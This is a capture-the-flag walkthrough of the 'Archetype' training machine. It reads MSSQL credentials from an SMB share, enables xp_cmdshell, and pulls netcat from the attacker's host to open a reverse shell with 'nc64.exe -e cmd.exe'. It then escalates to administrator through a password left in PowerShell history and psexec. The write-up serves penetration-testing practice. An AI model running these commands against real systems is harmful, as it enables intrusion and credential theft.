# CTF Walkthrough: Archetype

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Information Gathering](#2-information-gathering)
- [3. Foothold](#3-foothold)
- [4. Privilege Escalation](#4-privilege-escalation)

---

## 1. Introduction

**Category:** SMB, Impacket, MSSQL, powershell, File Transfer, NetCat, Reverse Shell, psexec, mssqlclient
**Difficulty Level:** Very Easy   
**CVE(s) involved:** -

---

## 2. Information Gathering

### 2.1. Initial Enumeration
- **Running Services**
    - Command: `nmap -sC -sV 10.129.204.214`
        - Output:
            ```
            PORT     STATE SERVICE      VERSION
            135/tcp  open  msrpc        Microsoft Windows RPC
            139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
            445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
            1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
            | ms-sql-info:
            |   10.129.204.214:1433:
            |     Version:
            |       name: Microsoft SQL Server 2017 RTM
            |       number: 14.00.1000.00
            |       Product: Microsoft SQL Server 2017
            |       Service pack level: RTM
            |       Post-SP patches applied: false
            |_    TCP port: 1433
            |_ssl-date: 2025-05-13T09:16:45+00:00; 0s from scanner time.
            | ms-sql-ntlm-info:
            |   10.129.204.214:1433:
            |     Target_Name: ARCHETYPE
            |     NetBIOS_Domain_Name: ARCHETYPE
            |     NetBIOS_Computer_Name: ARCHETYPE
            |     DNS_Domain_Name: Archetype
            |     DNS_Computer_Name: Archetype
            |_    Product_Version: 10.0.17763
            | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
            | Not valid before: 2025-05-13T08:52:34
            |_Not valid after:  2055-05-13T08:52:34
            5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
            |_http-server-header: Microsoft-HTTPAPI/2.0
            |_http-title: Not Found
            Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
            ```
    - Command: `smbclient -L \\\\10.129.204.214`
        - Output:
            ```
            Password for [WORKGROUP\herrken]:

                    Sharename       Type      Comment
                    ---------       ----      -------
                    ADMIN$          Disk      Remote Admin
                    backups         Disk
                    C$              Disk      Default share
                    IPC$            IPC       Remote IPC
            Reconnecting with SMB1 for workgroup listing.
            do_connect: Connection to 10.129.204.214 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
            Unable to connect with SMB1 -- no workgroup available
            ```
    - Command: `smbclient \\\\10.129.95.187\\backups`
        - Output:
            ```
            smb: \> ls
              .                                   D        0  Mon Jan 20 20:20:57
            2020
              ..                                  D        0  Mon Jan 20 20:20:57
            2020
              prod.dtsConfig                     AR      609  Mon Jan 20 20:23:02
            2020

                            5056511 blocks of size 4096. 2586479 blocks available
            smb: \>
            ```
    - Command: `get prod.dtsConfig`
    - Command: `cat prod.dtsConfig`
        - Output:
            ```
            ...
            Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc
            ...
            ```
    - Command: `impacket-mssqlclient -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.129.204.214`
        - Output:
            ```
            Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

            [*] Encryption required, switching to TLS
            [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
            [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
            [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
            [*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
            [*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
            [*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
            [!] Press help for extra shell commands
            SQL (ARCHETYPE\sql_svc  dbo@master)>
            ```

## 3. Foothold
- **Check role in MSSQL Server:**
    - Command: `SELECT is_srvrolemember('sysadmin');`
        - Output:
            ```
            -
            1
            ```
- **Check whether xp_cmdshell is activated:**
    - Command: `EXEC xp_cmdshell 'net user';`
        - Output: 
            ```
            ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

            ```
- **Active xp_cmdshell:**
    - Command: ` EXEC sp_configure 'show advanced options' ,1`
    - Command: `RECONFIGURE`
    - Command: `EXEC sp_configure 'xp_cmdshell' , 1`
    - Command: `RECONFIGURE`

- **Check xp_cmdshell:**
    - Command: `xp_cmdshell "whoami"`
        - Output:
            ```
            -----------------
            archetype\sql_svc

            NULL
            ```
- **Reverse Shell:**
    - **Transfer of NetCat:**
        - Download NetCat
            - Source: https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
        - Start a Python Server in the directory with nc64.exe
            - Command: `sudo python3 -m http.server 8888`
        - Start NetCat
            - Command: `sudo nc -lvnp 1261`
        - Download Netcat in Target
            - Command: `EXEC xp_cmdshell 'powershell -c cd C:/Users/sql_svc/Downloads; wget http://10.10.14.174:8888/nc64.exe -o nc64.exe'`

    - **Reverse Shell**
        - Command: `EXEC xp_cmdshell 'powershell -c cd C:/Users/sql_svc/Downloads; ./nc64.exe -e cmd.exe 10.10.14.174 1261'`

- **User Flag:**
    - Command: `cd \Users\sql_svc\Desktop`
    - Command: `type user.txt`
        - Output:
            ```
            3e7b102e78218e935bf3f4951fec21a3
            ```
## 4. Privilege Escalation
- **Transfer of WinPEAS:**
    - Download WinPEAS
        - Source : https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
    - Download WinPEAS in Target
        - Command: `powershell`
        - Commnad: `wget http://10.10.14.174:8888/winPEASx64.exe -outfile winPEASx64.exe`

- **Run WinPEAS:**
    - Command: `.\winPEASx64.exe`
        - Output:
            ```
            ����������͹ PowerShell Settings
            PowerShell v2 Version: 2.0
            PowerShell v5 Version: 5.1.17763.1
            PowerShell Core Version:
            Transcription Settings:
            Module Logging Settings:
            Scriptblock Logging Settings:
            PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
            PS history size: 79B

            ```

- Check ConsoleHost_history.txt
    - Commnad: `type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
        - Output:
            ```
            net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
            exit
            ```
- Log in to PsExec
    - Command: `impacket-psexec administrator@10.129.204.214`
        - Output:
            ```
            ...
            [*] Creating service umBO on 10.129.204.214.....
            [*] Starting service umBO.....
            [!] Press help for extra shell commands
            Microsoft Windows [Version 10.0.17763.2061]
            (c) 2018 Microsoft Corporation. All rights reserved.

            C:\Windows\system32>
            ```
- **Root Flag:**
    - Command: `cd \Users\administrator\Desktop`
    - Command: `type root.txt`
        - Output:
            ```
            b91ccec3305e98240082d4474b848528
            ```



        



